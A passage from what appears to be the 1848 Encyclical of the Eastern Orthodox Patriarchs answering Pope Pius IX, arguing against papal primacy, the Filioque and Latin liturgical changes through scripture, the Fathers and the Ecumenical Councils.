6. This heresy, which has united to itself many innovations, as has been said, appeared about the middle of the seventh century, at first and secretly, and then under various disguises, over the Western Provinces of Europe, until by degrees, creeping along for four or five centuries, it obtained precedence over the ancient orthodoxy of those parts, through the heedlessness of Pastors and the countenance of Princes. Little by little it overspread not only the hitherto orthodox Churches of Spain, but also the German, and French, and Italian Churches, whose orthodoxy at one time was sounded throughout the world, with whom our divine Fathers such as the great Athanasius and heavenly Basil conferred, and whose sympathy and fellowship with us until the seventh Ecumenical Council, preserved unharmed the doctrine of the Catholic and Apostolic Church. But in process of time, by envy of the devil, the novelties respecting the sound and orthodox doctrine of the Holy Ghost, the blasphemy of whom shall not be forgiven unto men either in this world or the next, according to the saying of our Lord (Matt. xii. 32), and others that succeeded respecting the divine Mysteries, particularly that of the world-saving Baptism, and the Holy Communion, and the Priesthood, like prodigious births, overspread even Old Rome; and thus sprung, by assumption of special distinctions in the Church as a badge and title, the Papacy. Some of the Bishops of that City, styled Popes, for example Leo III and John VIII, did indeed, as has been said, denounce the innovation, and published the denunciation to the world, the former by those silver plates, the latter by his letter to the holy Photius at the eighth Ecumenical Council, and another to Sphendopulcrus, by the hands of Methodius, Bishop of Moravia. The greater part, however, of their successors, the Popes of Rome, enticed by the antisynodical privileges offered them for the oppression of the Churches of God, and finding in them much worldly advantage, and &quot;much gain,&quot; and conceiving a Monarchy in the Catholic Church and a monopoly of the gifts of the Holy Ghost, changed the ancient worship at will, separating themselves by novelties from the old received Christian Polity. Nor did they cease their endeavors, by lawless projects (as veritable history assures us), to entice the other four Patriarchates into their apostasy from Orthodoxy, and so subject the Catholic Church to the whims and ordinances of men.

7. Our illustrious predecessors and fathers, with united labor and counsel, seeing the evangelical doctrine received from the Fathers to be trodden under foot, and the robe of our Savior woven from above to be torn by wicked hands, and stimulated by fatherly and brotherly love, wept for the desolation of so many Christians for whom Christ died. They exercised much zeal and ardor, both synodically and individually, in order that the orthodox doctrine of the Holy Catholic Church being saved, they might knit together as far as they were able that which had been rent; and like approved physicians they consulted together for the safety of the suffering member, enduring many tribulations, and contempts, and persecutions, if haply the Body of Christ might not be divided, or the definitions of the divine and august Synods be made of none effect. But veracious history has transmitted to us the relentlessness of the Western perseverance in error. These illustrious men proved indeed on this point the truth of the words of our holy father Basil the sublime, when he said, from experience, concerning the Bishops of the West, and particularly of the Pope: &quot;They neither know the truth nor endure to learn it, striving against those who tell them the truth, and strengthening themselves in their heresy&quot; (to Eusebius of Samosata). Thus, after a first and second brotherly admonition, knowing their impenitence, shaking them off and avoiding them, they gave them over to their reprobate mind. &quot;War is better than peace, apart from God,&quot; as said our holy father Gregory, concerning the Arians. From that time there has been no spiritual communion between us and them; for they have with their own hands dug deep the chasm between themselves and Orthodoxy.

8. Yet the Papacy has not on this account ceased to annoy the peaceful Church of God, but sending out everywhere so-called missionaries, men of reprobate minds, it compasses land and sea to make one proselyte, to deceive one of the Orthodox, to corrupt the doctrine of our LORD, to adulterate, by addition, the divine Creed of our holy Faith, to prove the Baptism which God gave us superfluous, the communion of the Cup void of sacred efficacy, and a thousand other things which the demon of novelty dictated to the all-daring Schoolmen of the Middle Ages and to the Bishops of the elder Rome, venturing all things through lust of power. Our blessed predecessors and fathers, in their piety, though tried and persecuted in many ways and means, within and without, directly and indirectly, &quot;yet confident in the LORD,&quot; were able to save and transmit to us this inestimable inheritance of our fathers, which we too, by the help of God, will transmit as a rich treasure to the generations to come, even to the end of the world. But notwithstanding this, the Papists do not cease to this day, nor will cease, according to wont, to attack Orthodoxy,—a daily living reproach which they have before their eyes, being deserters from the faith of their fathers. Would that they made these aggressions against the heresy which has overspread and mastered the West. For who doubts that had their zeal for the overthrow of Orthodoxy been employed for the overthrow of heresy and novelties, agreeable to the God-loving counsels of Leo III and John VIII, those glorious and last Orthodox Popes, not a trace of it, long ago, would have been remembered under the sun, and we should now be saying the same things, according to the Apostolic promise. But the zeal of those who succeeded them was not for the protection of the Orthodox Faith, in conformity with the zeal worthy of all remembrance which was in Leo III., now among the blessed.

9. In a measure the aggressions of the later Popes in their own persons had ceased, and were carried on only by means of missionaries. But lately, Pius IX., becoming Bishop of Rome and proclaimed Pope in 1847, published on the sixth of January, in this present year, an Encyclical Letter addressed to the Easterns, consisting of twelve pages in the Greek version, which his emissary has disseminated, like a plague coming from without, within our Orthodox Fold. In this Encyclical, he addresses those who at different times have gone over from different Christian Communions, and embraced the Papacy, and of course are favorable to him, extending his arguments also to the Orthodox, either particularly or without naming them; and, citing our divine and holy Fathers (p. 3, 1.14-18; p. 4, 1.19; p. 9, 1.6; and pp. 17, 23), he manifestly calumniates them and us their successors and descendants: them, as if they admitted readily the Papal commands and rescripts without question because issuing from the Popes is undoubted arbiters of the Catholic Church; us, as unfaithful to their examples (for thus he trespasses on the Fold committed to us by God), as severed from our Fathers, as careless of our sacred trusts, and of the soul's salvation of our spiritual children. Usurping as his own possession the Catholic Church of Christ, by occupancy, as he boasts, of the Episcopal Throne of St. Peter, he desires to deceive the more simple into apostasy from Orthodoxy, choosing for the basis of all theological instruction these paradoxical words (p. 10, 1.29): &quot;nor is there any reason why ye refuse a return to the true Church and Communion with this my holy Throne.&quot;

10. Each one of our brethren and sons in Christ who have been piously brought up and instructed, wisely regarding the wisdom given him from God, will decide that the words of the present Bishop of Rome, like those of his schismatical predecessors, are not words of peace, as he affirms (p. 7,1.8), and of benevolence, but words of deceit and guile, tending to self-aggrandizement, agreeably to the practice of his antisynodical predecessors. We are therefore sure, that even as heretofore, so hereafter the Orthodox will not be beguiled. For the word of our LORD is sure (John x. 5), A stranger will they not follow, but flee from him, for they know not the voice of strangers.

11. For all this we have esteemed it our paternal and brotherly need, and a sacred duty, by our present admonition to confirm you in the Orthodoxy you hold from your forefathers, and at the same time point out the emptiness of the syllogisms of the Bishop of Rome, of which he is manifestly himself aware. For not from his Apostolic Confession does he glorify his Throne, but from his Apostolic Throne seeks to establish his dignity, and from his dignity, his Confession. The truth is the other way. The Throne of Rome is esteemed that of St. Peter by a single tradition, but not from Holy Scripture, where the claim is in favor of Antioch, whose Church is therefore witnessed by the great Basil (Ep. 48 Athan.) to be &quot;the most venerable of all the Churches in the world.&quot; Still more, the second Ecumenical Council, writing to a Council of the West (to the most honorable and religious brethren and fellow-servants, Damasus, Ambrose, Britto, Valerian, and others), witnesseth, saying: &quot;The oldest and truly Apostolic Church of Antioch, in Syria, where first the honored name of Christians was used.&quot; We say then that the Apostolic Church of Antioch had no right of exemption from being judged according to divine Scripture and synodical declarations, though truly venerated for the throne of St. Peter. But what do we say? The blessed Peter, even in his own person, was judged before all for the truth of the Gospel, and, as Scripture declares, was found blamable and not walking uprightly. What opinion is to be formed of those who glory and pride themselves solely in the possession of his Throne, so great in their eyes? Nay, the sublime Basil the great, the Ecumenical teacher of Orthodoxy in the Catholic Church, to whom the Bishops of Rome are obliged to refer us (p. 8, 1.31), has clearly and explicitly above ( 7) shown us what estimation we ought to have of the judgments of the inaccessible Vatican:—&quot;They neither,&quot; he says, &quot;know the truth, nor endure to learn it, striving against those who tell them the truth, and strengthening themselves in their heresy.&quot; So that these our holy Fathers whom his Holiness the Pope, worthily admiring as lights and teachers even of the West, accounts as belonging to us, and advises us (p. 8) to follow, teach us not to judge Orthodoxy from the holy Throne, but the Throne itself and him that is on the Throne by the sacred Scriptures, by Synodical decrees and limitations, and by the Faith which has been preached, even the Orthodoxy of continuous teaching. Thus did our Fathers judge and condemn Honorius, Pope of Rome, and Dioscorus, Pope of Alexandria, and Macedonius and Nestorius, Patriarchs of Constantinople, and Peter Gnapheus, Patriarch of Antioch, with others. For if the abomination of desolation stood in the Holy Place, why not innovation and heresy upon a holy Throne? Hence is exhibited in a brief compass the weakness and feebleness of the efforts in behalf of the despotism of the Pope of Rome. For, unless the Church of Christ was founded upon the immovable rock of St. Peter’s Confession, Thou art the Christ, the Son of the Living God (which was the answer of the Apostles in common, when the question was put to them, Whom say ye that I am? (Matt. xvi. 15,) as the Fathers, both Eastern and Western, interpret the passage to us), the Church was built upon a slippery foundation, even on Cephas himself, not to say on the Pope, who, after monopolizing the Keys of the Kingdom of Heaven, has made such an administration of them as is plain from history. But our divine Fathers, with one accord, teach that the sense of the thrice-repeated command, Feed my sheep, implied no prerogative in St. Peter over the other Apostles, least of all in his successors. It was a simple restoration to his Apostleship, from which he had fallen by his thrice-repeated denial. St. Peter himself appears to have understood the intention of the thrice-repeated question of our Lord: Lovest thou Me, and more, and than these?. (John xxi. 16;) for, calling to mind the words, Thou all shall be offended because of Thee, yet will 1 never be offended (Matt. xxvi. 33), he was grieved because He said unto him the third time, Lovest thou Me? But his successors, from self-interest, understand the expression as indicative of St. Peter's more ready mind.

12. His Holiness the Pope says (p. viii. 1.12.) that our LORD said to Peter (Luke xxii. 32), I have prayed for thee, that thy faith fail not: and when thou art converted, strengthen thy brethren. Our LORD so prayed because Satan had sought to overthrow the faith of all the disciples, but the LORD allowed him Peter only, chiefly because he had uttered words of boasting, and justified himself above the rest (Matt. xxvi. 33): Though all shall be offended, because of thee, yet will I never be offended. The permission to Satan was but temporary. He began to curse and to swear: I know not the man. So weak is human nature, left to itself. The spirit is willing, but the flesh is weak. It was but temporary, that, coming again to himself by his return in tears of repentance, he might the rather strengthen his brethren who had neither perjured themselves nor denied. Oh! the wise judgment of the LORD! How divine and mysterious was the last night of our Savior upon earth! That sacred Supper is believed to be consecrated to this day in every Church: This do in remembrance of me (Luke xxii. 19), and As often as ye eat this bread and drink this cup, ye do show the LORD's death till he come (1 Cor. xi. 26). Of the brotherly love thus earnest1y commended to us by the common Master, saying, By this shall all men know that ye are my disciple, if ye have love one to another (John xiii. 35), have the Popes first broken the stamp and seal, supporting and receiving heretical novelties, contrary to the things delivered to us and canonically confirmed by our Teachers and Fathers in common. This love acts at this day with power in the souls of Christian people, and particularly in their leaders. We boldly avow before God and men, that the prayer of our Savior (p. ix. l.43) to God and His Father for the common love and unity of Christians in the One Holy Catholic and Apostolic Church, in which we believe, that they may be one, ever as we are one (John xvii. 22), worketh in us no less than in his Holiness. Our brotherly love and zeal meet that of his Holiness, with only this difference, that in us it worketh for the covenanted preservation of the pure, undefiled, divine, spotless, and perfect Creed of the Christian Faith, in conformity to the voice of the Gospel and the decrees of the seven holy Ecumenical Synods and the teachings of the ever-existing Catholic Church: but worketh in his Holiness to prop and strengthen the authority and dignity of them that sit on the Apostolic Throne, and their new doctrine. Behold then, the head and front, so to speak, of all the differences and disagreements that have happened between us and them, and the middle wall of partition, which we hope will be taken away in the time of is Holiness, and by the aid of his renowned wisdom, according to the promise of God (St. John x. 16): &quot;Other sheep I have which are not of this fold: them also 1 must bring and they shall hear my voice (Who proceedeth from the Father &quot;). Let it be said then, in the third place, that if it be supposed, according to the words of his Holiness, that this prayer of our LORD for Peter when about to deny and perjure himself, remained attached and united to the Throne of Peter, and is transmitted with power to those who from time to time sit upon it, although, as has before been said, nothing contributes to confirm the opinion (as we are strikingly assured from the example of the blessed Peter himself, even after the descent of the Holy Ghost, yet are we convinced from the words of our LORD, that the time will come when that divine prayer concerning the denial of Peter, &quot;that his faith might not fail for ever&quot; will operate also in some one of the successors of his Throne, who will also weep, as he did, bitterly, and being sometime converted will strengthen us, his brethren, still more in the Orthodox Confession, which we hold from our forefathers;—and would that his Holiness might be this true successor of the blessed Peter! To this our humble prayer, what hinders that we should add our sincere and hearty Counsel in the name of the Holy Catholic Church? We dare not say, as does his Holiness (p. x. 1.22), that it should be done &quot;without any delay;&quot; but without haste, utter mature consideration, and also, if need be, after consultation with the more wise, religious, truth-loving, and prudent of the Bishops, Theologians, and Doctors, to be found at the present day, by God's good Providence, in every nation of the West.

13. His Holiness says that the Bishop of Lyons, St. Irenaeus, writes in praise of the Church of Rome: &quot;That the whole Church, namely, the faithful from everywhere, must come together in that Church, because of its Primacy, in which Church the tradition, given by the Apostles, has in all respects been observed by the faithful everywhere.&quot; Although this saint says by no means what the followers of the Vatican would make out, yet even granting their interpretation, we reply: Who denies that the ancient Roman Church was Apostolic and Orthodox? None of us will question that it was a model of orthodoxy. We will specially add, for its greater praise, from the historian Sozomen (Hist. Eccl. lib. iii. cap. 12), the passage, which his Holiness has overlooked, respecting the mode by which for a time she was enabled to preserve the orthodoxy which we praise:—&quot;For, as everywhere,&quot; saith Sozomen, &quot;the Church throughout the West, being guided purely by the doctrines of the Fathers, was delivered from contention and deception concerning these things.&quot; Would any of the Fathers or ourselves deny her canonical privilege in the rank of the hierarchy, so long as she was guided purely by the doctrines of the Fathers, walking by the plain rule of Scripture and the holy Synods! But at present we do not find preserved in her the dogma of the Blessed Trinity according to the Creed of the holy Fathers assembled first in Nicea and afterwards in Constantinople, which the other five Ecumenical Councils confessed and confirmed with such anathemas on those who adulterated it in the smallest particular, as if they had thereby destroyed it. Nor do we find the Apostolical pattern of holy Baptism, nor the Invocation of the consecrating Spirit upon the holy elements: but we see in that Church the eucharistic Cup, heavenly drink, considered superfluous, (what profanity!) and very many other things, unknown not only to our holy Fathers, who were always entitled the catholic, clear rule and index of Orthodoxy, as his Holiness, revering the truth, himself teaches (p. vi), but also unknown to the ancient holy Fathers of the West. We see that very primacy, for which his Holiness now contends with all his might, as did his predecessors, transformed from a brotherly character and hierarchical privilege into a lordly superiority. What then is to be thought of his unwritten traditions, if the written have undergone such a change and alteration for the worse ? Who is so bold and confident in the dignity of the Apostolic Throne, as to dare to say that if our holy Father, Sr. Irenaeus, were alive again, seeing it was fallen from the ancient and primitive teaching in so many most essential and catholic articles of Christianity, he would not be himself the first to oppose the novelties and self-sufficient constitutions of that Church which was lauded by him as guided purely by the doctrines of the Fathers? For instance, when he saw the Roman Church not only rejecting from her Liturgical Canon, according to the suggestion of the Schoolmen, the very ancient and Apostolic invocation of the Consecrating Spirit, and miserably mutilating the Sacrifice in its most essential part, but also urgently hastening to cut it out from the Liturgies of other Christian Communions also,—his Holiness slanderously asserting, in a manner so unworthy of the Apostolic Throne on which he boasts himself, that it &quot;crept in after t.he division between the East and West&quot; (p. xi. 1.11)—what would not the holy Father say respecting this novelty ? Irenaeus assures us (lib. iv. c. 34) &quot;that bread, from the ground, receiving the evocation of God, is no longer common bread,&quot; etc., meaning by &quot;evocation&quot; invocation: for that Irenaeus believed the Mystery of the Sacrifice to be consecrated by means of this invocation is especially remarked even by Franciscus Feu-Ardentius, of the order of popish monks called Minorites, who in 1639 edited the writings of that saint with comments, who says (lib. i. c. 18, p. 114,) that Irenaeus teaches &quot;that the bread and mixed cup become the true Body and Blood of Christ by the words of invocation.&quot; Or, hearing of the vicarial and appellate jurisdiction of the Pope, what would not the Saint say, who, for a small and almost indifferent question concerning the celebration of Easter (Euseb. Eccl. Hist. v. 26), so boldly and victoriously opposed and defeated the violence of Pope Victor in the free Church of Christ? Thus he who is cited by his Holiness as a witness of the primacy of the Roman Church, shows that its dignity is not that of a lordship, nor even appellate, to which St. Peter himself was never ordained, but is a brotherly privilege in the Catholic Church, and an honor assigned the Popes on account of the greatness and privilege of the City. Thus, also, the fourth Ecumenical Council, for the preservation of the gradation in rank of Churches canonically established by the third Ecumenical Council (Canon 8),—following the second (Canon 3), as that again followed the first (Canon 6), which called the appellate jurisdiction of the Pope over the West a Custom,—thus uttered its determination: &quot;On account of that City being the Imperial City, the Fathers have with reason given it prerogatives&quot; (Canon 28). Here is nothing said of the Pope's special monopoly of the Apostolicity of St. Peter, still less of a vicarship in Rome's Bishops, and an universal Pastorate. This deep silence in regard to such great privileges—nor only so, but the reason assigned for the primacy, not &quot;Feed my sheep,&quot; not &quot;On this rock will I build my Church,&quot; but simply old Custom, and the City being the Imperial City; and these things, not from the LORD, but from the Fathers—will seem, we are sure, a great paradox to his Holiness entertaining other ideas of his prerogatives. The paradox will be the greater, since, as we shall see, he greatly honors the said fourth Ecumenical Synod as one to be found a witness for his Throne; and St. Gregory, the eloquent, called the Great (lib. i. Ep. 25), was wont to speak of the four (Ecumenical Councils [not the Roman See] as the four Gospels, and the four-sided stone on which the Catholic Church is built.

14. His Holiness says (p. ix. 1.12) that the Corinthians, divided among themselves, referred the matter to Clement, Pope of Rome, who wrote to them his decision on the case; and they so prized his decision that they read it in the Churches. But this event is a very weak support for the Papal authority in the house of God. For Rome being then the center of the Imperial Province and the chief City, in which the Emperors lived, it was proper that any question of importance, as history shows that of the Corinthians to have been, should be decided there, especially if one of the contending parties ran thither for external aid: as is done even to this day. The Patriarchs of Alexandria, Antioch, and Jerusalem, when unexpected points of difficulty arise, write to the Patriarch of Constantinople, because of its being the seat of Empire, as also on account of its synodical privileges; and if this brotherly aid shall rectify that which should be rectified, it is well; but if not, the matter is reported to the province, according to the established system. But this brotherly agreement in Christian faith is not purchased by the servitude of the Churches of God. Let this be our answer also to the examples of a fraternal and proper championship of the privileges of Julius and Innocent Bishops of Rome, by St. Athanasius the Great and St. John Chrysostom, referred to by his Holiness (p. ix. 1. 6,17), for which their successors now seek to recompense us by adulterating the divine Creed. Yet was Julius himself indignant against some for &quot; disturbing the Churches by not maintaining the doctrines of Nice&quot; (Soz. Hist. Ec. lib. iii. c. 7), and threatening (id.) excommunication, &quot;if they ceased not their innovations.&quot; In the case of the Corinthians, moreover, it is to be remarked that the Patriarchal Thrones being then but three, Rome was the nearer and more accessible to the Corinthians, to which, therefore, it was proper to have resort. In all this we see nothing extraordinary, nor any proof of the despotic power of the Pope in the free Church of God.

15. But, finally, his Holiness says (p. ix. l.12) that the fourth Ecumenical Council (which by mistake he quite transfers from Chalcedon to Carthage), when it read the epistle of Pope Leo I, cried out, &quot;Peter has thus spoken by Leo.&quot; It was so indeed. But his Holiness ought not to overlook how, and after what examination, our fathers cried out, as they did, in praise of Leo. Since however his Holiness, consulting brevity, appears to have omitted this most necessary point, and the manifest proof that an Ecumenical Council is not only above the Pope but above any Council of his, we will explain to the public the matter as it really happened. Of more than six hundred fathers assembled in the Counci1 of Chalcedon, about two hundred of the wisest were appointed by the Council to examine both as to language and sense the said epistle of Leo; nor only so, but to give in writing and with their signatures their own judgment upon it, whether it were orthodox or not. These, about two hundred judgments and resolution on the epistle, as chiefly found in the Fourth Session of the said holy Council in such terms as the following:—&quot;Maximus of Antioch in Syria said: 'The epistle of the holy Leo, Archbishop of Imperial Rome, agrees with the decisions of the three hundred and eighteen holy fathers at Nice, and the hundred and fifty at Constantinople, which is new Rome, and with the faith expounded at Ephesus by the most holy Bishop Cyril: and I have subscribed it.&quot; 

And again: 

&quot;Theodoret,the most religious Bishop of Cyrus: 'The epistle of the most holy Archbishop, the lord Leo, agrees with the faith established at Nice by the holy and blessed fathers, and with the symbol of faith expounded at Constantinople by the hundred and fifty, and with the epistles of the blessed Cyril. And accepting it, I have subscribed the said epistle.&quot;'

And thus all in succession: &quot;The epistle corresponds,&quot; &quot;the epistle is consonant,&quot;the epistle agrees in sense,&quot; and the like. After such great and very severe scrutiny in comparing it with former holy Councils, and a full conviction of the correctness of the meaning, and not merely because it was the epistle of the Pope, they cried aloud, ungrudgingly, the exclamation on which his Holiness now vaunts himself: But if his Holiness had sent us statements concordant and in unison with the seven holy Ecumenical Councils, instead of boasting of the piety of his predecessors lauded by our predecessors and fathers in an Ecumenical Council, he might justly have gloried in his own orthodoxy, declaring his own goodness instead of that of his fathers. Therefore let his Holiness be assured, that if, even now, he will write us such things as two hundred fathers on investigation and inquiry shall find consonant and agreeing with the said former Councils, then, we say, he shall hear from us sinners today, not only, &quot;Peter has so spoken,&quot; or anything of like honor, but this also, &quot;Let the holy hand be kissed which has wiped away the tears of the Catholic Church.&quot;

16. And surely we have a right to expect from the prudent forethought of his Holiness, a work so worthy the true successor of St. Peter, of Leo I, and also of Leo III, who for security of the orthodox faith engraved the divine Creed unaltered upon imperishable plates—a work which will unite the churches of the West to the holy Catholic Church, in which the canonical chief seat of his Holiness, and the seats of all the Bishops of the West remain empty and ready to be occupied. For the Catholic Church, awaiting the conversion of the shepherds who have fallen off from her with their flocks, does not separate in name only, those who have been privily introduced to the rulership by the action of others, thus making little of the Priesthood. But we are expecting the &quot;word of consolation,&quot; and hope that he, as wrote St. Basil to St.Ambrose, Bishop of Milan (Epis. b6), will &quot;tread again the ancient footprints of the fathers.&quot; Not without great astonishment have we read the said Encyclical letter to the Easterns, in which we see with deep grief of soul his Holiness, famed for prudence, speaking like his predecessors in schism, words that urge upon us the adulteration of our pure holy Creed, on which the Ecumenical Councils have set their seal; and doing violence to the sacred Liturgies, whose heavenly structure alone, and the names of those who framed them, and their tone of reverend antiquity, and the stamp that was placed upon them by the Seventh Ecumenical Synod (Act vi.), should have paralyzed him, and made him to turn aside the sacrilegious and all-daring hand that has thus smitten the King of Glory. From these things we estimate into what an unspeakable labyrinth of wrong and incorrigible sin of revolution the papacy has thrown even the wiser and more godly Bishops of the Roman Church, so that, in order to preserve the innocent, and therefore valued vicarial dignity, as well as the despotic primacy and the things depending upon it, they know no other means shall to insult the most divine and sacred things, daring everything for that one end. Clothing themselves, in words, with pious reverence for &quot;the most venerable antiquity&quot; (p. xi. 1.16), in reality there remains, within, the innovating temper; and yet his Holiness really hears hard upon himself when he says that we &quot;must cast from us everything that has crept in among us since the Separation,&quot; (!) while he and his have spread the poison of their innovation even into the Supper of our LORD. His Holiness evidently takes it for granted that in the Orthodox Church the same thing has happened which he is conscious has happened in the Church of Rome since the rise of the Papacy: to wit, a sweeping change in all the Mysteries, and corruption from scholastic subtleties, a reliance on which must suffice as an equivalent for our sacred Liturgies and Mysteries and doctrines: yet all the while, forsooth, reverencing our &quot;venerable antiquity,&quot; and all this by a condescension entirely Apostolic!—&quot;without,&quot; as he says, &quot;troubling us by any harsh conditions&quot;! From such ignorance of the Apostolic and Catholic food on which we live emanates another sententious declaration of his (p. vii. 1. 22): &quot;It is not possible that unity of doctrine and sacred observance should be preserved among you,&quot; paradoxically ascribing to us the very misfortune from which he suffers at home; just as Pope Leo IX wrote to the blessed Michael Cerularius, accusing the Greeks of changing the Creed of the Catholic Church, without blushing either for his own honor or for the truth of history. We are persuaded that if his Holiness will call to mind ecclesiastical archaeology and history, the doctrine of the holy Fathers and the old Liturgies of France and Spain, and the Sacramentary of the ancient Roman Church, he will be struck with surprise on finding how many other monstrous daughters, now living, the Papacy has brought forth in the West: while Orthodoxy, with us, has preserved the Catholic Church as an incorruptible bride for her Bridegroom, although we have no temporal power, nor, as his Holiness says, any sacred &quot;observances,&quot; but by the sole tie of love and affection to a common Mother are bound together in the unity of a faith sealed with the seven seals of the Spirit (Rev. v. 1), and by the seven Ecumenical Councils, and in obedience to the Truth. He will find, also, flow many modern papistical doctrines and mysteries must be rejected as &quot;commandments of men&quot; in order that the Church of the West, which has introduced all sorts of novelties, may be changed back again to the immutable Catholic Orthodox faith of our common fathers. As his Holiness recognizes our common zeal in this faith, when he says (p. viii. l.30), &quot;let us take heed to the doctrine preserved by our forefathers,&quot; so he does well in instructing us (l. 31) to follow the old pontiffs and the faithful of the Eastern Metropolitans. What these thought of the doctrinal fidelity of the Archbishops of the elder Rome, and what idea we ought to have of them in the Orthodox Church, and in what manner we ought to receive their teachings, they have synodically given us an example ( 15), and the sublime Basil has well interpreted it ( 7). As to the supremacy, since we are not setting forth a treatise, let the same great Basil present the matter in a f'ew words, &quot;I preferred to address myself to Him who is Head over them.&quot;

17. From all this, every one nourished in sound Catholic doctrine, particularly his Holiness, must draw the conclusion, how impious and anti-synodical it is to attempt the alteration of our doctrine and liturgies and other divine offices which are, and are proved to be, coeval with the preaching of Christianity: for which reason reverence was always bestowed on then, and they were confided in as pure even by the old orthodox Popes themselves, to whom these things were an inheritance in common with ourselves. How becoming and holy would be the mending of the innovations, the time of whose entrance in the Church of Rome we know in each case; for our illustrious fathers have testified from time to time against each novelty. But there are other reasons which should incline his Holiness to this change. First, because those things that are ours were once venerable to the Westerns, as having the same divine Offices and confessing the same Creed; but the novelties were not known to our Fathers, nor could they be shown in the writings of the orthodox Western Fathers, nor as having their origin either in antiquity or catholicity. Moreover, neither Patriarchs nor Councils could then have introduced novelties amongst us, because the protector of religion is the very body of the Church, even the people themselves, who desire their religious worship to be ever unchanged and of the same kind as that of their fathers: for as, after the Schism, many of the Popes and Latinizing Patriarchs made attempts that came to nothing even in the Western Church; and as, from time to time, either by fair means or foul, the Popes have commanded novelties for the sake of expediency (as they have explained to our f'athers, although they were thus dismembering the Body of Christ): so now again the Pope, for the sake of a truly divine and most just expediency, forsooth (not mending the nets, but himself rending the garment of the Savior), dare to oppose the venerable things of antiquity,—things well fitted to preserve religion, as his Holiness confesses (p. xi. l.16), and which he himself honors, as he says (lb. 1.16), together with his predecessors, for he repeats that memorable expression o one of those blessed predecessors (Celestine, writing to the third Ecumenical Council): &quot;Let novelty cease to attack antiquity.&quot; And let the Catholic Church enjoy this benefit from this so far blameless declaration of the Popes. It must by all means be confessed, that in such his attempt, even though Pius IX be eminent for wisdom and piety, and, as he says, for zeal after Christian unity in the Catholic Church, he will meet, within and without, with difficulties and toils. And here we must put his Holiness in mind, if he will excuse our boldness, of that portion of his letter (p. viii. L.32), &quot;That in things which relate to the confession of our divine religion, nothing is to be feared, when we look to the glory of Christ, and the reward which awaits us in eternal life.&quot; It is incumbent on his Holiness to show before God and man, that, as prime mover of the counsel which pleases God, so is he a willing protector of the ill-treated evangelical and synodical truth, even to the sacrifice of his own interests, according to the Prophet (Is. lx. 17), A ruler in peace and a bishop in righteousness. So be it! But until there be this desired returning of the apostate Churches to the body of the One, Holy, Catholic, and Apostolic Church, of which Christ is the Head (Eph. iv. 15), and each of us &quot;members in particular,&quot; all advice proceeding from them, and every officious exhortation tending to the dissolution of our pure faith handed down from the Fathers is condemned, as it ought to be, synodically, not only as suspicious and to be eschewed, but as impious and soul-destroying: and in this category, among the first we place the said Encyclical to the Easterns from Pope Pius IX, Bishop of the elder Rome; and such we proclaim it to be in the Catholic Church.

18. Wherefore, beloved brethren and fellow-ministers of our mediocrity, as always, so also now, particularly on this occasion of the publication of the said Encyclical, we hold it to be our inexorable duty, in accordance with our patriarchal and synodical responsibility, in order that none may be lost to the divine fold of the Catholic Orthodox Church, the most holy Mother of us all, to encourage each other, and to urge you that, reminding one another of the words and exhortations of St. Paul to our holy predecessors when he summoned them to Ephesus, we reiterate to each other: take heed, therefore, unto yourselves, and to all the flock, over the which the Holy Ghost hath made you overseers, to feed the Church of God, which He hath purchased with His own Blood. For know this, that after my departing shall grievous wolves enter in among you not sparing the flock. Also of your own selves shall men arise, speaking perverse things, to draw away disciples after them. Therefore,watch. (Acts xx.28-31.) Then our predecessors and Fathers, hearing this divine charge, wept sore, and falling upon his neck, kissed him. Come, then, and let us, brethren, hearing him admonishing us with tears, fall in spirit, lamenting, upon his neck, and, kissing him, comfort him by our own firm assurance, that no one shall separate us from the love of Christ, no one mislead us from evangelical doctrine, no one entice us from the safe path of our fathers, as none was able to deceive them, by any degree of zeal which they manifested, who from time to time were raised up for this purpose by the tempter: so that at last we shall hear from the Master: Well done, good and faithful servant, receiving the end of our faith, even the salvation of our souls, and of the reasonable flock over whom the Holy Ghost has made us shepherds.

19. This Apostolic charge and exhortation we have quoted for your sake, and address it to all the Orthodox congregation, wherever they be found settled on the earth, to the Priests and Abbots, to the Deacons and Monks, in a word, to all the Clergy and godly People, the rulers and the ruled, the rich and the poor, to parents and children, to teachers and scholars, to the educated and uneducated, to masters and servants, that we all, supporting and counseling each other, may be able to stand against the wiles of the devil. For thus St. Peter the Apostle exhorts us (1 Pet.): Be sober, be vigilant because your adversary the devil, as a roaring lion walketh about, seeking whom he may devour. Whom resist, steadfast in the faith.

20. For our faith, brethren, is not of men nor by man, but by revelation of Jesus Christ, which the divine Apostles preached, the holy Ecumenical Councils confirmed, the greatest and wisest teachers of the world handed down in succession, and the shed blood of the holy martyrs ratified. Let us hold fast to the confession which we have received unadulterated from such men, turning away from every novelty as a suggestion of the devil. He that accepts a novelty reproaches with deficiency the preached Orthodox Faith. But that Faith has long ago been sealed in completeness, not to admit of diminution or increase, or any change whatever; and he who dares to do, or advise, or think of such a thing has already denied the faith of Christ, has already of his own accord been struck with an eternal anathema, for blaspheming the Holy Ghost as not having spoken fully in the Scriptures and through the Ecumenical Councils. This fearful anathema, brethren and sons beloved in Christ, we do not pronounce today, but our Savior first pronounced it (Matt. xii. 32): Whosoever speaketh against the Holy Ghost, it shall not be forgiven him, neither in this world, neither in the world to come. St. Paul pronounced the same anathema (Gal. i. 6): I marvel that ye are so soon removed from Him that called you into the grace of Christ, unto another Gospel: which is not another; but there be some that trouble you, and would pervert the Gospel of Christ. But though we, or an angel from heaven, preach any other gospel unto you, than that which we have preached unto you, let him be accursed. This same anathema the Seven Ecumenical Councils and the whole choir of God-serving fathers pronounced. All, therefore, innovating, either by heresy or schism, have voluntarily clothed themselves, according to the Psalm (cix. 18), (&quot;with a curse as with a garment,&quot;) whether they be Popes, or Patriarchs, or Clergy, or Laity; nay, if any one, though an angel from heaven, preach any other Gospel unto you than that ye have received, let him be accursed. Thus our wise fathers, obedient to the soul-saving words of St. Paul, were established firm and steadfast in the faith handed down unbrokenly to them, and preserved it unchanged and uncontaminate in the midst of so many heresies, and have delivered it to us pure and undefiled, as it came pure from the mouth of the first servants of the Word. Let us, too, thus wise, transmit it, pure as we have received it, to coming generations, altering nothing, that they may be, as we are, full of confidence, and with nothing to be ashamed of when speaking of the faith of their forefathers.

